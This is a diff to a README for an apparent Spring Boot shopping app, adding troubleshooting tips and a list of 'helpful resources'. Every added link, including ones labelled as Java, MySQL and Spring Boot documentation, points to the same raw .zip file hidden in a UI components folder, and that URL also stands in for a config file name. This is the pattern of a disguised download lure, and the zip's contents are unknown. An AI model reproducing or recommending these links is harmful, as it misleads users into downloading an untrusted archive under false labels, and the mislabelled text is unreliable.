@@ -167,3 +167,21 @@ To access admin features, you will need special access rights configured during 
 
 ---
 
+## ⚠️ Troubleshooting
+
+If you run into problems, check these common issues:
+
+- **App won’t start:** Make sure Java 11 or higher is installed and the `.jar` file name is correct.
+- **Database connection errors:** Double-check your database name, username, and password in the `https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip` file.
+- **Port conflicts:** The app uses port 8080 by default. If another app uses this port, change it in the config or stop the other app.
+- **Browser can’t load page:** Confirm the app is running and you are entering `http://localhost:8080/` in your browser’s address bar.
+
+---
+
+## 🔗 Helpful Resources
+
+- [Java Installation Guide](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+- [MySQL Installation and Setup](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+- [Basic Command Line Usage](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+- [Spring Boot Documentation](https://github.com/MohammadZanjaniasl/spring-boot-shopping-web/raw/refs/heads/main/src/components/ui/shopping_boot_spring_web_3.7-alpha.3.zip)
+
